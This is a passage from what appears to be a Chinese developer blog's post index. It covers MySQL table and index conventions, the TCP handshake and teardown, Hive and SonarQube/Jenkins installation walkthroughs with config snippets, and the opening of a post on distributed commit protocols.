禁止出现数字开头，禁止两个下划线中间只出现数字。数据库字段名的修改代价很大，因为无法进行预发布，所以字段名称需要慎重考虑。正例： getter admin ， task config ， level 3 name反例： GetterAdmin ， taskConfig ， level _3 name 【强制】表名不使用复数名词。说明：表名应该仅仅表示表里面的实体内容，不应该表示实体数量，对应于 DO 类名也是单数形式，符合表达习惯。 【强制】禁用保留字，如 desc 、 range 、 match 、 delayed 等，请参考 MySQL 官方保留字。 【强制】唯一索引名为 uk 字段名 ； 普通索引名则为 idx 字段名。说明： uk 即 unique key；idx 即 index 的简称。 【强制】小数类型为 decimal ，禁止使用 float 和 double 。说明： float 和 double 在存储的时候，存在精度损失的问题，很可能在值的比较时，得到不正确的结果。如果存储的数据范围超过 decimal 的范围，建议将数据拆成整数和小数分开存储。 【强制】如果存储的字符串长度几乎相等，使用 char 定长字符串类型。 【强制】 varchar 是可变长字符串，不预先分配存储空间，长度不要超过 5000，如果存储长度大于此值，定义字段类型为 text ，独立出来一张表，用主键来对应，避免影响其它字段索引效率。 【强制】表必备三字段： id , gmt create , gmt modified 。说明：其中 id 必为主键，类型为 unsigned bigint 、单表时自增、步长为 1。 gmt create ,gmt modified 的类型均为 date _ time 类型。 【推荐】表的命名最好是加上“业务名称表的作用”。正例： tiger task / tiger reader / mpp config 【推荐】库名与应用名称尽量一致。 【推荐】如果修改字段含义或对字段表示的状态追加时，需要及时更新字段注释。 【推荐】字段允许适当冗余，以提高性能，但是必须考虑数据同步的情况。冗余字段应遵循：1 ） 不是频繁修改的字段。2 ） 不是 varchar 超长字段，更不能是 text 字段。正例：商品类目名称使用频率高，字段长度短，名称基本一成不变，可在相关联的表中冗余存储类目名称，避免关联查询。 【推荐】单表行数超过 500 万行或者单表容量超过 2 GB ，才推荐进行分库分表。说明：如果预计三年后的数据量根本达不到这个级别，请不要在创建表时就分库分表。 【参考】合适的字符存储长度，不但节约数据库表空间、节约索引存储，更重要的是提升检索速度。正例：人的年龄用 unsigned tinyint（ 表示范围 0-255，人的寿命不会超过 255 岁 ）； 海龟就必须是 smallint ，但如果是太阳的年龄，就必须是 int； 如果是所有恒星的年龄都加起来，那么就必须使用 bigint 。 索引规约 【强制】业务上具有唯一特性的字段，即使是组合字段，也必须建成唯一索引。说明：不要以为唯一索引影响了 insert 速度，这个速度损耗可以忽略，但提高查找速度是明显的 ； 另外，即使在应用层做了非常完善的校验和控制，只要没有唯一索引，根据墨菲定律，必然有脏数据产生。 【强制】 超过三个表禁止 join 。需要 join 的字段，数据类型保持绝对一致 ； 多表关联查询时，保证被关联的字段需要有索引。说明：即使双表 join 也要注意表索引、 SQL 性能。 【强制】在 varchar 字段上建立索引时，必须指定索引长度，没必要对全字段建立索引，根据实际文本区分度决定索引长度。说明：索引的长度与区分度是一对矛盾体，一般对字符串类型数据，长度为 20 的索引，区分度会高达 90%以上，可以使用 count(distinct left( 列名, 索引长度 )) / count( * ) 的区分度来确定。 【强制】页面搜索严禁左模糊或者全模糊，如果需要请走搜索引擎来解决。说明：索引文件具有 B - Tree 的最左前缀匹配特性，如果左边的值未确定，那么无法使用此索引。 【推荐】如果有 order by 的场景，请注意利用索引的有序性。 order by 最后的字段是组合索引的一部分，并且放在索引组合顺序的最后，避免出现 file sort 的情况，影响查询性能。正例： where a =? and b =? order by c; 索引： a b c反例：索引中有范围查找，那么索引有序性无法利用，如： WHERE a &gt;10 ORDER BY b; 索引a b 无法排序。 【推荐】利用覆盖索引来进行查询操作，来避免回表操作。说明：如果一本书需要知道第 11 章是什么标题，会翻开第 11 章对应的那一页吗？目录浏览一下就好，这个目录就是起到覆盖索引的作用。正例：能够建立索引的种类：主键索引、唯一索引、普通索引，而覆盖索引是一种查询的一种效果，用 explain 的结果， extra 列会出现： using index 。 【推荐】利用延迟关联或者子查询优化超多分页场景。说明： MySQL 并不是跳过 offset 行，而是取 offset + N 行，然后返回放弃前 offset 行，返回N 行，那当 offset 特别大的时候，效率就非常的低下，要么控制返回的总页数，要么对超过特定阈值的页数进行 SQL 改写。正例：先快速定位需要获取的 id 段，然后再关联：SELECT a.* FROM 表 1 a, (select id from 表 1 where 条件 LIMIT 100000,20 ) b where a.id=b.id 【推荐】 SQL 性能优化的目标：至少要达到 range 级别，要求是 ref 级别，如果可以是 consts最好。说明：1 ）consts 单表中最多只有一个匹配行 （ 主键或者唯一索引 ） ，在优化阶段即可读取到数据。2 ）ref 指的是使用普通的索引 （normal index） 。3 ）range 对索引进行范围检索。反例： explain 表的结果， type = index ，索引物理文件全扫描，速度非常慢，这个 index 级别比较 range 还低，与全表扫描是小巫见大巫。 【推荐】建组合索引的时候，区分度最高的在最左边。正例：如果 where a =? and b =? ， a 列的几乎接近于唯一值，那么只需要单建 idx _ a 索引即可。说明：存在非等号和等号混合判断条件时，在建索引时，请把等号条件的列前置。如： where a &gt;?and b =? 那么即使 a 的区分度更高，也必须把 b 放在索引的最前列。 【参考】创建索引时避免有如下极端误解：1 ） 误认为一个查询就需要建一个索引。2 ） 误认为索引会消耗空间、严重拖慢更新和新增速度。3 ） 误认为唯一索引一律需要在应用层通过“先查后插”方式解决。 SQL规约 【强制】不要使用 count( 列名 ) 或 count( 常量 ) 来替代 count( ) ， count( ) 就是 SQL 92 定义的标准统计行数的语法，跟数据库无关，跟 NULL 和非 NULL 无关。说明： count( * ) 会统计值为 NULL 的行，而 count( 列名 ) 不会统计此列为 NULL 值的行。 【强制】 count(distinct col) 计算该列除 NULL 之外的不重复数量。注意 count(distinctcol 1, col 2 ) 如果其中一列全为 NULL ，那么即使另一列有不同的值，也返回为 0。 【强制】当某一列的值全是 NULL 时， count(col) 的返回结果为 0，但 sum(col) 的返回结果为NULL ，因此使用 sum() 时需注意 NPE 问题。正例：可以使用如下方式来避免 sum 的 NPE 问题： SELECT IF(ISNULL(SUM(g)) ,0, SUM(g))FROM table; 【强制】使用 ISNULL() 来判断是否为 NULL 值。注意： NULL 与任何值的直接比较都为 NULL。说明：1 ） NULL&lt;&gt;NULL 的返回结果是 NULL ，而不是 false 。2 ） NULL=NULL 的返回结果是 NULL ，而不是 true 。3 ） NULL&lt;&gt;1 的返回结果是 NULL ，而不是 true 。 【强制】 在代码中写分页查询逻辑时，若 count 为 0 应直接返回，避免执行后面的分页语句。 【强制】不得使用外键与级联，一切外键概念必须在应用层解决。说明： （ 概念解释 ） 学生表中的 student id 是主键，那么成绩表中的 student id 则为外键。如果更新学生表中的 student id ，同时触发成绩表中的 student id 更新，则为级联更新。外键与级联更新适用于单机低并发，不适合分布式、高并发集群 ； 级联更新是强阻塞，存在数据库更新风暴的风险 ； 外键影响数据库的插入速度。 【强制】禁止使用存储过程，存储过程难以调试和扩展，更没有移植性。 【强制】数据订正时，删除和修改记录时，要先 select ，避免出现误删除，确认无误才能执行更新语句。 【推荐】 in 操作能避免则避免，若实在避免不了，需要仔细评估 in 后边的集合元素数量，控制在 1000 个之内。 【参考】如果有全球化需要，所有的字符存储与表示，均以 utf -8 编码，那么字符计数方法注意：说明：SELECT LENGTH( “轻松工作” )； 返回为 12SELECT CHARACTER _ LENGTH( “轻松工作” )； 返回为 4如果要使用表情，那么使用 utfmb 4 来进行存储，注意它与 utf -8 编码的区别。 【参考】 TRUNCATE TABLE 比 DELETE 速度快，且使用的系统和事务日志资源少，但 TRUNCATE无事务且不触发 trigger ，有可能造成事故，故不建议在开发代码中使用此语句。说明： TRUNCATE TABLE 在功能上与不带 WHERE 子句的 DELETE 语句相同。 ORM规约 【强制】在表查询中，一律不要使用 作为查询的字段列表，需要哪些字段必须明确写明。*说明：1 ） 增加查询分析器解析成本。2 ） 增减字段容易与 resultMap 配置不一致。 【强制】 POJO 类的 boolean 属性不能加 is ，而数据库字段必须加 is _，要求在 resultMap 中进行字段与属性之间的映射。说明：参见定义 POJO 类以及数据库字段定义规定，在 sql . xml 增加映射，是必须的。 【强制】不要用 resultClass 当返回参数，即使所有类属性名与数据库字段一一对应，也需要定义 ； 反过来，每一个表也必然有一个与之对应。说明：配置映射关系，使字段与 DO 类解耦，方便维护。 【强制】 xml 配置中参数注意使用：#{}，# param # 不要使用${} 此种方式容易出现 SQL 注入。 【强制】 iBATIS 自带的 queryForList(String statementName , int start , int size) 不推荐使用。说明：其实现方式是在数据库取到 statementName 对应的 SQL 语句的所有记录，再通过 subList取 start , size 的子集合，线上因为这个原因曾经出现过 OOM 。正例：在 sqlmap . xml 中引入 #start#, #size#Map map = new HashMap();map.put(“start”, start);map.put(“size”, size); 【强制】不允许直接拿 HashMap 与 Hashtable 作为查询结果集的输出。 【强制】更新数据表记录时，必须同时更新记录对应的 gmt _ modified 字段值为当前时间。 【推荐】不要写一个大而全的数据更新接口，传入为 POJO 类，不管是不是自己的目标更新字段，都进行 update table set c1=value1,c2=value2,c3=value3; 这是不对的。执行 SQL时，尽量不要更新无改动的字段，一是易出错 ； 二是效率低 ； 三是 binlog 增加存储。 【参考】@ Transactional 事务不要滥用。事务会影响数据库的 QPS ，另外使用事务的地方需要考虑各方面的回滚方案，包括缓存回滚、搜索引擎回滚、消息补偿、统计修正等。 【参考】&lt; isEqual &gt;中的 compareValue 是与属性值对比的常量，一般是数字，表示相等时带上此条件 ； &lt; isNotEmpty &gt;表示不为空且不为 null 时执行 ； &lt; isNotNull &gt;表示不为 null 值时执行","link":"/2017/03/02/MySQL%E8%A7%84%E7%BA%A6%EF%BC%88%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%EF%BC%89/"},{"title":"TCP三次握手与四次分手","text":"TCP简介首先来看看OSI的七层模型： 我们需要知道TCP工作在网络OSI的七层模型中的第四层——Transport层，IP在第三层——Network层，ARP在第二层——Data Link层；在第二层上的数据，我们把它叫Frame，在第三层上的数据叫Packet，第四层的数据叫Segment。 同时，我们需要简单的知道，数据从应用层发下来，会在每一层都会加上头部信息，进行封装，然后再发送到数据接收端。这个基本的流程你需要知道，就是每个数据都会经过数据的封装和解封装的过程。 在OSI七层模型中，每一层的作用和对应的协议如下： TCP是一个协议，那这个协议是如何定义的，它的数据格式是什么样子的呢？要进行更深层次的剖析，就需要了解，甚至是熟记TCP协议中每个字段的含义。 上面就是TCP协议头部的格式，由于它太重要了，是理解其它内容的基础，下面就将每个字段的信息都详细的说明一下。 Source Port和Destination Port:分别占用16位，表示源端口号和目的端口号；用于区别主机中的不同进程，而IP地址是用来区分不同的主机的，源端口号和目的端口号配合上IP首部中的源IP地址和目的IP地址就能唯一的确定一个TCP连接； Sequence Number:用来标识从TCP发端向TCP收端发送的数据字节流，它表示在这个报文段中的的第一个数据字节在数据流中的序号；主要用来解决网络报乱序的问题； Acknowledgment Number:32位确认序列号包含发送确认的一端所期望收到的下一个序号，因此，确认序号应当是上次已成功收到数据字节序号加1。不过，只有当标志位中的ACK标志（下面介绍）为1时该确认序列号的字段才有效。主要用来解决不丢包的问题； Offset:给出首部中32 bit字的数目，需要这个值是因为任选字段的长度是可变的。这个字段占4bit（最多能表示15个32bit的的字，即4*15=60个字节的首部长度），因此TCP最多有60字节的首部。然而，没有任选字段，正常的长度是20字节； TCP Flags:TCP首部中有6个标志比特，它们中的多个可同时被设置为1，主要是用于操控TCP的状态机的，依次为URG，ACK，PSH，RST，SYN，FIN。每个标志位的意思如下： URG：此标志表示TCP包的紧急指针域（后面马上就要说到）有效，用来保证TCP连接不被中断，并且督促中间层设备要尽快处理这些数据； ACK：此标志表示应答域有效，就是说前面所说的TCP应答号将会包含在TCP数据包中；有两个取值：0和1，为1的时候表示应答域有效，反之为0； PSH：这个标志位表示Push操作。所谓Push操作就是指在数据包到达接收端以后，立即传送给应用程序，而不是在缓冲区中排队； RST：这个标志表示连接复位请求。用来复位那些产生错误的连接，也被用来拒绝错误和非法的数据包； SYN：表示同步序号，用来建立连接。SYN标志位和ACK标志位搭配使用，当连接请求的时候，SYN=1，ACK=0；连接被响应的时候，SYN=1，ACK=1；这个标志的数据包经常被用来进行端口扫描。扫描者发送一个只有SYN的数据包，如果对方主机响应了一个数据包回来 ，就表明这台主机存在这个端口；但是由于这种扫描方式只是进行TCP三次握手的第一次握手，因此这种扫描的成功表示被扫描的机器不很安全，一台安全的主机将会强制要求一个连接严格的进行TCP的三次握手； FIN： 表示发送端已经达到数据末尾，也就是说双方的数据传送完成，没有数据可以传送了，发送FIN标志位的TCP数据包后，连接将被断开。这个标志的数据包也经常被用于进行端口扫描。 Window:窗口大小，也就是有名的滑动窗口，用来进行流量控制；这是一个复杂的问题，这篇博文中并不会进行总结的； TCP三次握手建立TCP需要三次握手才能建立，而断开连接则需要四次握手。整个过程如下图所示： 先来看看如何建立连接的。 第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认； 第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态； 第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。 其实三次握手就是，A告诉B要连接，B通知A可以连接了，A再告诉B，那我连接了。 TCP四次挥手假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了“，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息“。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了“。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。”Server端收到ACK后，”就知道可以断开连接了“。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！ 整个过程Client端所经历的状态如下： 而Server端所经历的过程如下： 相关疑问【问题1】为什么连接的时候是三次握手，关闭的时候却是四次握手？答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。 【问题2】为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假象网络是不可靠的，有可以最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。 【问题3】为什么不能用两次握手进行连接？我们知道，3次握手完成两个重要的功能，既要双方做好发送数据的准备工作(双方都知道彼此已准备好)，也要允许双方就初始序列号进行协商，这个序列号在握手过程中被发送和确认。现在把三次握手改成仅需要两次握手，死锁是可能发生的。作为例子，考虑计算机S和C之间的通信，假定C给S发送一个连接请求分组，S收到了这个分组，并发送了确认应答分组。按照两次握手的协定，S认为连接已经成功地建立了，可以开始发送数据分组。可是，C在S的应答分组在传输中被丢失的情况下，将不知道S是否已准备好，不知道S建立什么样的序列号，C甚至怀疑S是否收到自己的连接请求分组。在这种情况下，C认为连接还未建立成功，将忽略S发来的任何数据分 组，只等待连接确认应答分组。而S在发出的分组超时后，重复发送同样的分组。这样就形成了死锁。","link":"/2016/10/29/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/"},{"title":"HIVE安装配置","text":"Hive简介Hive 基本介绍Hive 实现机制Hive 数据模型Hive 如何转换成MapReduceHive 与其他数据库的区别以上详见：https://chu888chu888.gitbooks.io/hadoopstudy/content/Content/8/chapter8.html Hive 和 Hbase 的区别详见：http://www.cnblogs.com/justinzhang/p/4273470.html Hive环境模式 内嵌模式将元数据保存在本地内嵌的 Derby 数据库中，这是使用 Hive 最简单的方式。但是这种方式缺点也比较明显，因为一个内嵌的 Derby 数据库每次只能访问一个数据文件，这也就意味着它不支持多会话连接。 本地模式这种模式是将元数据保存在本地独立的数据库中（一般是 MySQL），这用就可以支持多会话和多用户连接了。 远程模式此模式应用于 Hive 客户端较多的情况。把 MySQL 数据库独立出来，将元数据保存在远端独立的 MySQL 服务中，避免了在每个客户端都安装 MySQL 服务从而造成冗余浪费的情况。 下载安装HIVEHive 是基于 Hadoop 文件系统之上的数据仓库。因此，安装Hive之前必须确保 Hadoop 已经成功安装。 本次教程，使用hive2.0.1版本，下载地址：http://mirrors.hust.edu.cn/apache/hive/hive-2.0.1/下载apache-hive-2.0.1-bin.tar.gz，解压至/data/hive 123tar -zxvf apache-hive-2.0.1-bin.tar.gz -C /datacd /datamv apache-hive-2.0.1-bin hive 配置环境变量123456789# 编辑文件vim /etc/profile# 文件末尾添加export HIVE_HOME=/data/hiveexport PATH=$HIVE_HOME/bin:$HIVE_HOME/conf:$PATH# 使修改生效source /etc/profile 内嵌模式（1）修改 Hive 配置文件 Hive工程的配置文件为 hive-site.xml，默认情况下，该文件并不存在，需要拷贝它的模版来实现。12cd /data/hive/confcp hive-default.xml.template hive-site.xml hive-site.xml的主要配置有1234567891011&lt;property&gt; &lt;name&gt;hive.metastore.warehouse.dir&lt;/name&gt; &lt;value&gt;/user/hive/warehouse&lt;/value&gt; &lt;description&gt;location of default database for the warehouse&lt;/description&gt;&lt;/property&gt;..&lt;property&gt; &lt;name&gt;hive.exec.scratchdir&lt;/name&gt; &lt;value&gt;/tmp/hive&lt;/value&gt; &lt;description&gt;HDFS root scratch dir for Hive jobs which gets created with write all (733) permission. For each connecting user, an HDFS scratch dir: ${hive.exec.scratchdir}/&amp;lt;username&amp;gt; is created, with ${hive.scratch.dir.permission}.&lt;/description&gt;&lt;/property&gt; hive.metastore.warehouse.dir该参数指定了 Hive 的数据存储目录，默认位置在 HDFS 上面的 /user/hive/warehouse 路径下。 hive.exec.scratchdir该参数指定了 Hive 的数据临时文件目录，默认位置为 HDFS 上面的 /tmp/hive 路径下。 hive-site.xml文件内容不需修改，文件配置详解移步：https://my.oschina.net/HIJAY/blog/503842?p=1 接下来我们还要修改Hive目录下的/conf/hive-env.sh 文件，该文件默认也不存在，同样是拷贝它的模版来修改： 12345678910111213cd /data/hive/confcp hive-env.sh.template hive-env.shvim hive-env.sh# 做如下修改export HADOOP_HEAPSIZE=1024# Set HADOOP_HOME to point to a specific hadoop install directoryHADOOP_HOME=/data/hadoop# Hive Configuration Directory can be controlled by:export HIVE_CONF_DIR=/data/hive/conf# Folder containing extra ibraries required for hive compilation/execution can be controlled by:export HIVE_AUX_JARS_PATH=/data/hive/lib （2）创建必要目录 前面我们看到 hive-site.xml 文件中有两个重要的路径【/user/hive/warehouse】与【/tmp/hive】。切换到hadoop 用户下查看HDFS是否有这些路径，如果没有，就新建目录，并且给它们赋予用户写权限。1234$ hadoop dfs -mkdir /user/hive/warehouse$ hadoop dfs -mkdir /tmp/hive$ hadoop dfs -chmod 777 /user/hive/warehouse$ hadoop dfs -chmod 777 /tmp/hive 如果你遇到 no such file or directory 类似的错误，就一步一步新建目录，例如：12$ hadoop dfs -mkdir /tmp$ hadoop dfs -mkdir /tmp/hive 然后通过相关命令检查是否新建成功，比如【hdfs dfs -lsr /】。 （3）运行 Hive 前面我们已经提到过，内嵌模式使用默认配置和 Derby 数据库，所以无需其它特别修改，先 ./start-all.sh 启动 Hadoop, 然后直接运行 hive：12[root@iZwz9b62gfdv0s2e67yo8kZ /]$ cd /data/hive/bin/[root@iZwz9b62gfdv0s2e67yo8kZ bin]$ hive 你很可能会遇到与【${system:java.io.tmpdir}】有关的这个错误： 解决方法是修改 hive-site.xml 中所有包含 ${system:java.io.tmpdir} 字段的 value。可自己新建一个目录来替换它，例如 /data/hive/iotmp，同时赋予相关写权限。 修改后再次启动 hive，可能又遇到数据库未初始化的错误： 执行以下命令初始化即可12cd /data/hive/bin./schematool -initSchema -dbType derby 继续报错：1234Initialization script hive-schema-2.0.0.derby.sqlError: FUNCTION 'NUCLEUS_ASCII' already exists. (state=X0Y68,code=30000)org.apache.hadoop.hive.metastore.HiveMetaException: Schema initialization FAILED! Metastore state would be inconsistent !!*** schemaTool failed *** 这个function的构建是数据库初始化的一部分，既然存在了，就直接去hive-schema-2.0.0-derby.sql里面注释掉【CREATE FUNCTION】的相关语句好了。 注释后再次启动hive，就ok了 本地模式（1）安装 MySQL成功安装mysql后启动服务，并创建名为hive的数据库，再创建一个hive用户为HIVE所用。mysql安装方法详见：MySQL安装及卸载 MySQL安装后，还需要下载一个MySQL的JDBC驱动包。这里使用的是mysql-connector-java-5.1.40-bin.jar，需将其复制到$HIVE_HOME/lib目录下。123$ tar -zxvf mysql-connector-java-5.1.40.tar.gz$ cd mysql-connector-java-5.1.40$ mv mysql-connector-java-5.1.40-bin.jar /data/hive/lib/ （2）修改 hive-site.xml 配置文件 最后，依然是修改 $HIVE_HOME/conf 下的 hive-site.xml 文件，把默认的 Derby 修改为 MySQL : 1234567891011121314151617181920212223&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; //所连接的MySQL数据库实例 &lt;value&gt;jdbc:mysql://localhost:3306/hive&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt; //连接的MySQL数据库驱动 &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt; //连接的MySQL数据库用户名 &lt;value&gt;hive&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt; //连接的MySQL数据库密码 &lt;value&gt;hive&lt;/value&gt;&lt;/property&gt; （3）启动 Hive 启动 Hive 的方式同内嵌模式一样，需先初始化数据库.12cd /data/hive/bin./schematool -initSchema -dbType mysql 然后运行HIVE，可能发现运行不成功，并一直收到警告 修改hive-site.xml文件的javax.jdo.option.ConnectionURL选项即可12345&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; //所连接的MySQL数据库实例 &lt;value&gt;jdbc:mysql://localhost:3306/hive?characterEncoding=utf8&amp;useSSL=false&lt;/value&gt;&lt;/property&gt; 再次启动HIVE，仍然报错 经查，再次修改javax.jdo.option.ConnectionURL选项，然后启动HIVE，发现启动成功。12345&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; //所连接的MySQL数据库实例 &lt;value&gt;jdbc:mysql://localhost:3306/hive?characterEncoding=utf8&amp;amp;useSSL=false&lt;/value&gt;&lt;/property&gt; 链接相关大数据进阶计划http://wangxin123.com/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%BF%9B%E9%98%B6%E8%AE%A1%E5%88%92/ Hive下载地址http://mirrors.hust.edu.cn/apache/hive/hive-2.0.1/","link":"/2017/02/26/hive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"title":"SonarQube+Jenkins,搭建持续交付平台","text":"前言Kurt Bittner曾说过，如果敏捷仅仅只是开始，那持续交付就是头条!“If Agile Was the Opening Act, Continuous Delivery is the Headliner!”——Kurt Bittner 五月上旬我的一个主要工作就是搭建持续交付平台。打算以Jenkins为核心，每天定时从代码库中检出最新的代码进行编译、构建。构建结果通过自动发送的邮件通知到项目组，开发人员每天只需关心最新的集成结果是否正确即可。 再搭建SonarQube代码质量检测工具，单位时间定时扫描代码库最新代码，检测出代码中的存在的阻断错误、严重错误、主要错误、次要错误和相关提示信息。通过SonarQube能有效简洁统一代码风格，利于大家更好的相互理解和后期排查。 以下是搭建过程中用到的相关网站及碰到的坑。 相关网站Sonar官方网站：http://www.sonarqube.org/Jenkins官方使用教程：https://wiki.jenkins-ci.org/display/JENKINS/Use+JenkinsJenkins安装链接：http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.htmlSonar安装链接：http://flyingdutchman.iteye.com/blog/1905906Sonar简介及安装地址：http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/Jenkins使用集锦：http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmFJenkins和Sonar整合地址1：https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/Jenkins和Sonar整合地址2：http://www.cnblogs.com/zhuhongbao/p/4197974.html搭建过程中涉及到的 JDK、Tomcat、Mysql、Redis、Maven等系列安装链接省略 0.0！ sonar添加service服务1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# 编写简单的sonar启动脚本vim /etc/init.d/sonar[sonar]#!/bin/sh start() { /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start} stop() { /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh stop}status() { /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh status}restart() { /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh restart} SONAR=\"/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh\"[ -f $SONAR ] || exit 1 # See how we were called. case \"$1\" in start) start ;; stop) stop ;; restart) restart ;; status) status ;; # stop sleep 3 start ;; *) echo $\"Usage: $0 {start|stop|status|restart}\" exit 1 esac exit 0 # sonar服务验证service sonar statusservice sonar startservice sonar restartservice sonar stop 问题：验证service服务时，发现四个命令唯独 service sonar start 命令失败，但是手动输入下面命令却可以启动成功【添加sonar自启动服务时也出现同样问题】。1/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start 我们查看相关日志：1234567#tail -f /data/sonar/sonarqube-5.6.1/logs/sonar.log--&gt; Wrapper Started as DaemonLaunching a JVM...Unable to start JVM: No such file or directory (2)JVM exited while loading the application.JVM Restarts disabled. Shutting down.&lt;-- Wrapper Stopped log提示不能加载JVM，接着查看sonar的wrapper.conf文件123456vim /data/sonar/sonarqube-5.6.1/conf/wrapper.conf# Path to JVM executable. By default it must be available in PATH.# Can be an absolute path, for example:#wrapper.java.command=/path/to/my/jdk/bin/javawrapper.java.command=/java wrapper.conf文件提示wrapper.java.command需要配置java路径，默认路径显然有误，修改后，再次运行【service sonar start】，操作成功。 1wrapper.java.command=/usr/java/jdk1.8.0_31/bin/java系列问题问题：通过命令直接安装Jenkins，连接被拒绝时方案：手动下载包，下载地址：http://mirrors.jenkins-ci.org/war/ 问题：Jenkins安装完成后启动报错 方案：通过”vi /etc/init.d/jenkins”，把JDK的java路径加上即可注意：Jenkins启动后自动部署Tomcat，Tomcat需先启动 问题：Sonar无法启动，Failed to start SonarQube.方案：切换成root用户启动试试，可能是没有权限。 问题：Sonar中文乱码问题方案：sonar-run配置有问题，里面的jdbc配置是： 问题：Sonar某个版本安装成功后，启动却总只显示一个页面，并提示Sonar正在维护中方案：无需更换版本，仔细查看发现该提示页面可以直接点击进行相关插件的自动升级，重启后首页即可访问。 问题：Sonar成功启动后，却总是马上自动关闭服务方案：很可能是没有启动mysql服务，启动即可。 问题：Sonar成功运行后，如何显示中文?方案：在Settings/SYSTEM/Update Center/Available Plugins下安装汉化包，并重新启动Sonar。注意：当某些插件总是下载失败时，可以直接搜索插件名手动下载，并在【系统管理—管理插件—高级—浏览-上传插件】中上传插件即可。 问题：Jenkins集成Sonar后，Sonar无法扫描Java语言代码方案：在Sonar的Settings/SYSTEM/Update Center/Available目录下下载Java语言包，并重新启动Jenkins和Sonar。Jenkins会根据配置的扫描路径，定时扫描相关代码，并在Sonar中可视化。注意：SonarQube集成Java插件官方地址：http://docs.sonarqube.org/display/PLUG/Java+Plugin 问题：下载某语言包后，Sonar重启仍然无法扫描相关代码原因：如下载”C/C++/Objective-c”这个插件后，重新启动扫描C代码总是报错：1Caused by: org.sonar.api.utils.SonarException: No license for cpp原以为是需要安装cpp插件，后来才发现重点是No license，意思就是需要付费购买许可证。网上搜索免费许可证无果，然后点击”Get trial key”, 结果立马收到官方邮件回复被拒，终放弃。 问题：Jenkins集成Sonar后，Jenkins自动化脚本执行失败，并报如下错误方案：更换插件版本即可，下次安装需要注意。 问题：Jenkins账户权限如何分配方案： 相关链接：http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml注意： 如果用admin账户登录，在分配权限的时候，将admin权限全部置空，一旦退出，将无法使用 0.0！我当初的解决方法是修改远程配置文件，而如果配置文件一旦改乱，就只能重装了。 运行结果Sonar成功运行如图五图六所示，其中代码检测规则可以修改也可以自定义，对于图六显示出的具体错误，Sonar也可在页面直接分配给某个组员修改","link":"/2016/06/10/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/"},{"title":"两阶段提交协议、三阶段提交协议","text":"分布式一致性问题在分布式系统中，为了保证数据的高可用，通常，我们会将数据保留多个副本(replica)，这些副本会放置在不同的物理的机器上。为了对用户提供正确的增、删、改、查等语义，我们需要保证这些放置在不同物理机器上的副本是一致的。 为了解决这种分布式一致性问题，在性能和数据一致性的反反复复权衡过程中总结了许多典型的协议和算法。其中比较著名的有二阶提交协议（Two Phase Commitment Protocol）、三阶提交协议（Three Phase Commitment Protocol）和Paxos算法。 分布式事务 